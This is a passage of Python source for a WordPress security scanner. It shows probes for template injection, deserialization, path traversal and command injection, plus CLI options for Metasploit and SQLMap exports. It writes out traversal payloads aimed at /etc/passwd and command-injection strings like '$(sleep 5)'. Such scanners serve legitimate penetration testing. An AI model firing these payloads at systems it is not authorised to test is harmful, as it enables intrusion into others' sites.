                        if r and r.status_code == 200:
                            # Check if payload was executed
                            if '49' in r.text or 'request' in r.text.lower():
                                self.add_vulnerability(
                                    f"Server-Side Template Injection ({engine})",
                                    f"Possible SSTI in parameter '{param}' using {engine} syntax",
                                    "critical",
                                    confidence="medium",
                                    evidence=f"Payload: {payload}",
                                    exploit_available=True
                                )

                    except Exception:
                        pass

    def test_deserialization_vulns(self) -> None:
        """Test for insecure deserialization"""
        self.log("[*] Testing for deserialization vulnerabilities...", Fore.BLUE)

        # PHP serialization payloads
        php_gadgets = [
            'O:8:"stdClass":0:{}',
            'a:1:{i:0;O:8:"stdClass":0:{}}',
        ]

        # Check cookies for serialized data
        try:
            r = self.make_request(self.target_url)
            if r:
                for cookie in r.cookies:
                    # Check for PHP serialization
                    if cookie.value.startswith('O:') or cookie.value.startswith('a:'):
                        self.add_vulnerability(
                            "Insecure Deserialization in Cookie",
                            f"Cookie '{cookie.name}' contains serialized PHP data: {cookie.value[:50]}",
                            "high",
                            confidence="medium",
                            exploit_available=True
                        )

        except Exception:
            pass

    def test_path_traversal(self) -> None:
        """Test for path traversal vulnerabilities"""
        self.log("[*] Testing for path traversal...", Fore.BLUE)

        # Path traversal payloads
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
        ]

        test_params = ['file', 'path', 'page', 'include', 'doc', 'template']

        for param in test_params:
            for payload in traversal_payloads:
                try:
                    test_url = f"{self.target_url}?{param}={requests.utils.quote(payload)}"
                    r = self.make_request(test_url)

                    if r and r.status_code == 200:
                        # Check for file content indicators
                        if any(indicator in r.text for indicator in ['root:', 'daemon:', '[extensions]', 'for 16-bit']):
                            self.add_vulnerability(
                                "Path Traversal / Local File Inclusion",
                                f"Path traversal vulnerability in parameter '{param}'",
                                "critical",
                                confidence="high",
                                evidence=f"Payload: {payload}, Response: {r.text[:100]}",
                                exploit_available=True
                            )
                            break

                except Exception:
                    pass

    def test_command_injection(self) -> None:
        """Test for OS command injection"""
        self.log("[*] Testing for command injection...", Fore.BLUE)

        # Command injection payloads
        cmd_payloads = [
            '; sleep 5',
            '| sleep 5',
            '`sleep 5`',
            '$(sleep 5)',
            '; ping -c 5 127.0.0.1',
        ]

        test_params = ['cmd', 'exec', 'command', 'ping', 'host', 'ip']

        for param in test_params:
            for payload in cmd_payloads:
                try:
                    test_url = f"{self.target_url}?{param}={requests.utils.quote(payload)}"

                    import time as time_module
                    start = time_module.time()
                    r = self.make_request(test_url, timeout=(10, 20))
                    elapsed = time_module.time() - start

                    # Time-based detection
                    if elapsed >= 5:
                        self.add_vulnerability(
                            "OS Command Injection",
                            f"Command injection vulnerability in parameter '{param}'",
                            "critical",
                            confidence="high",
                            evidence=f"Payload: {payload}, Response time: {elapsed:.2f}s",
                            exploit_available=True
                        )
                        break

                except Exception:
                    pass

    def enhanced_version_detection(self) -> None:
        """Enhanced WordPress version detection with multiple methods"""
        self.log("[*] Enhanced version fingerprinting...", Fore.BLUE)

        version_confidence = []

        # Method 1: Meta generator tag (already in detect_version)
        # Method 2: readme.html version
        # Method 3: RSS feed generator
        # Method 4: Specific file hashing
        # Method 5: CSS/JS versioning

        # Check specific version files
        version_files = {
            '/wp-includes/css/dashicons.min.css': {
                '6.3': 'dashicons-before',
                '6.2': 'dashicons-',
                '6.1': 'dashicon',
            },
            '/wp-includes/js/wp-emoji-release.min.js': {
                '6.3': 'wpemoji',
                '6.2': 'emoji',
            }
        }

        detected_versions = []

        for file_path, version_patterns in version_files.items():
            url = urljoin(self.target_url, file_path)
            try:
                r = self.make_request(url, timeout=(3, 8))
                if r and r.status_code == 200:
                    # Hash-based version detection
                    content_hash = hashlib.md5(r.content).hexdigest()

                    # Check patterns
                    for version, pattern in version_patterns.items():
                        if pattern in r.text:
                            detected_versions.append(version)

            except Exception:
                pass

        if detected_versions:
            # Use most common version
            from collections import Counter
            most_common = Counter(detected_versions).most_common(1)[0][0]
            if self.wp_version != most_common:
                self.log(f"    [*] Cross-validated version: {most_common}", Fore.CYAN)

    # ---------------- MAIN FLOW ----------------

    def run(self) -> None:
        """Main execution flow"""
        # Check for multi-target mode first
        if self.target_list:
            self.scan_multiple_targets()
            return

        self.banner()
        self.get_input()

        if not self.check_connection():
            self.log("[!] Scan aborted due to connection failure.", Fore.RED)
            return

        # Core checks
        self.detect_version()
        self.enumerate_plugins_themes()
        self.check_security_headers()
        self.check_wp_artifacts()
        self.check_directory_listing()
        self.check_robots_sitemap()
        self.check_sensitive_files()

        # Vulnerability tests
        self.test_user_enumeration()
        self.test_xmlrpc_vulnerabilities()
        self.check_database_errors()

        # REST API analysis
        self.analyze_rest_api()

        # v3.0 Advanced Scans
        if self.scan_secrets:
            self.scan_for_secrets()

        if self.enhanced_backups:
            self.enhanced_backup_fuzzing()

        if self.scan_cors:
            self.test_cors_misconfiguration()

        if self.scan_cookies:
            self.analyze_cookies()

        if self.scan_ssl:
            self.analyze_ssl_tls()

        if self.scan_graphql:
            self.test_graphql_security()

        # PRECISION ENHANCEMENTS - Advanced Vulnerability Testing
        if self.test_xxe:
            self.test_xxe_vulnerabilities()

        if self.test_ssrf:
            self.test_ssrf_vulnerabilities()

        if self.test_sqli:
            self.test_advanced_sqli()

        if self.test_auth:
            self.test_auth_bypass()

        if self.test_csrf:
            self.test_csrf_protection()

        if self.test_jwt:
            self.test_jwt_security()

        if self.test_ssti:
            self.test_ssti_vulnerabilities()

        if self.test_deserial:
            self.test_deserialization_vulns()

        if self.test_traversal:
            self.test_path_traversal()

        if self.test_cmdi:
            self.test_command_injection()

        if self.test_upload:
            self.test_file_upload_vulnerabilities()

        # Enhanced fingerprinting
        if self.advanced_scan:
            self.enhanced_version_detection()

        # v3.0 Post-scan processing
        if self.cvss_scoring:
            self.add_cvss_to_vulnerabilities()

        if self.compare_with:
            self.compare_with_previous_scan()

        # Generate reports (always last)
        self.generate_final_report()

        # v3.0 Additional exports
        if self.export_nuclei:
            self.export_nuclei_templates()

        if self.export_burp:
            self.export_burp_suite()

        if self.generate_wordlist:
            self.generate_custom_wordlist()

        # Generate enhanced remediation guide (always generated)
        self.generate_enhanced_remediation()

        # Send webhook notification if configured
        if self.webhook:
            self.send_webhook({'type': 'scan_complete'})


def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="W.A.D.U.H. - WordPress Analysis & Debugging Utility Helper v3.0 Complete Automation Edition",
        epilog="AUTHORIZED USE ONLY - Only scan targets you have permission to test"
    )

    parser.add_argument(
        '-u', '--url',
        type=str,
        help='Target URL (e.g., http://example.com)'
    )

    parser.add_argument(
        '--verify-ssl',
        action='store_true',
        help='Verify SSL certificates (default: disabled for testing)'
    )

    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Verbose output (show debug information)'
    )

    parser.add_argument(
        '-q', '--quiet',
        action='store_true',
        help='Quiet mode (minimal output)'
    )

    parser.add_argument(
        '-r', '--rate-limit',
        type=float,
        default=0.5,
        help='Rate limit between requests in seconds (default: 0.5)'
    )

    parser.add_argument(
        '-d', '--deep',
        action='store_true',
        help='Deep scan mode (more thorough but slower)'
    )

    parser.add_argument(
        '-o', '--output',
        type=str,
        default='.',
        help='Output directory for reports (default: current directory)'
    )

    parser.add_argument(
        '--wpscan-token',
        type=str,
        default=None,
        help='WPScan API token for vulnerability database checks (get free token at https://wpscan.com/api)'
    )

    parser.add_argument(
        '--no-color',
        action='store_true',
        help='Disable colored output'
    )

    parser.add_argument(
        '--export-metasploit',
        action='store_true',
        help='Export findings to Metasploit resource file (.rc)'
    )

    parser.add_argument(
        '--export-sqlmap',
        action='store_true',
        help='Export SQLMap commands for SQL injection testing'
    )

    parser.add_argument(
        '--generate-pocs',
        action='store_true',
        help='Generate proof-of-concept Python scripts'
    )


    # Multi-target scanning
    parser.add_argument(
        '--target-list',
        type=str,
        help='File with list of target URLs (one per line)'
    )

    parser.add_argument(
        '--parallel',
        type=int,
        default=3,
        help='Number of parallel scans for multi-target (default: 3)'
    )

    # Additional exports
    parser.add_argument(
        '--export-nuclei',
        action='store_true',
        help='Export Nuclei YAML templates'
    )

    parser.add_argument(
        '--export-burp',
        action='store_true',
        help='Export Burp Suite XML file'
    )

    parser.add_argument(
        '--export-zap',
        action='store_true',
        help='Export OWASP ZAP session'
    )

    parser.add_argument(
        '--generate-wordlist',
        action='store_true',
        help='Generate custom wordlist from site content'
    )

    # Advanced scanning
    parser.add_argument(
        '--scan-secrets',
        action='store_true',
        help='Scan for exposed API keys and secrets'
    )

    parser.add_argument(
        '--scan-cors',
        action='store_true',
        help='Test for CORS misconfigurations'
    )

    parser.add_argument(
        '--scan-cookies',
        action='store_true',
        help='Analyze cookie security'
    )

    parser.add_argument(
        '--scan-ssl',
        action='store_true',
        help='Analyze SSL/TLS configuration'
    )

    parser.add_argument(
        '--scan-graphql',
        action='store_true',
        help='Test GraphQL endpoints'
    )

    # Notifications & tracking
    parser.add_argument(
        '--webhook',
        type=str,
        help='Webhook URL for notifications (Slack/Discord/Teams)'
    )

    parser.add_argument(
        '--compare-with',
        type=str,
        help='Compare with previous scan JSON file'
    )

    # Enhancements
    parser.add_argument(
        '--cvss-scoring',
        action='store_true',
        help='Calculate CVSS v3.1 scores for vulnerabilities'
    )

    parser.add_argument(
        '--enhanced-backups',
        action='store_true',
        help='Enhanced backup file fuzzing (50+ patterns)'
    )

    parser.add_argument(
        '--scan-subdomains',
        action='store_true',
        help='Enumerate WordPress subdomains'
    )

    # PRECISION ENHANCEMENT - Advanced Vulnerability Testing
    parser.add_argument(
        '--advanced',
        action='store_true',
        help='Enable ALL advanced precision tests (XXE, SSRF, SQLi, Auth bypass, etc.)'
    )

    parser.add_argument(
        '--test-xxe',
        action='store_true',
        help='Test for XML External Entity (XXE) vulnerabilities'
    )

    parser.add_argument(
        '--test-ssrf',
        action='store_true',
        help='Test for Server-Side Request Forgery (SSRF)'
    )

    parser.add_argument(
        '--test-sqli',
        action='store_true',
        help='Advanced SQL injection testing (time-based, error-based, union-based)'
    )

    parser.add_argument(
        '--test-auth',
        action='store_true',
        help='Test authentication bypass techniques'
    )

    parser.add_argument(
        '--test-csrf',
        action='store_true',
        help='Analyze CSRF protection mechanisms'
    )

    parser.add_argument(
        '--test-jwt',
        action='store_true',
        help='Test JWT token security'
    )

    parser.add_argument(
        '--test-ssti',
        action='store_true',
        help='Test for Server-Side Template Injection (SSTI)'
    )

    parser.add_argument(
        '--test-deserial',
        action='store_true',
        help='Test for insecure deserialization vulnerabilities'
    )

    parser.add_argument(
        '--test-traversal',
        action='store_true',
        help='Test for path traversal / local file inclusion'
    )

    parser.add_argument(
        '--test-cmdi',
        action='store_true',
        help='Test for OS command injection'
    )

    parser.add_argument(
        '--test-upload',
        action='store_true',
        help='Analyze file upload security'
    )

    return parser.parse_args()


if __name__ == "__main__":
    try:
        args = parse_arguments()

        # Disable colors if requested
        if args.no_color:
            init(strip=True, convert=False)

        scanner = YikesScanner(args)

        # If URL provided via CLI, use it
        if args.url:
            scanner.target_url = args.url.rstrip('/')
            if not scanner.target_url.startswith("http"):
                scanner.target_url = "http://" + scanner.target_url
            scanner.log(f"[*] Target set to: {scanner.target_url}\n", Fore.GREEN)
            scanner.banner()

        scanner.run()

    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[!] W.A.D.U.H. stopped by user.")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"\n[!] Unexpected error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)
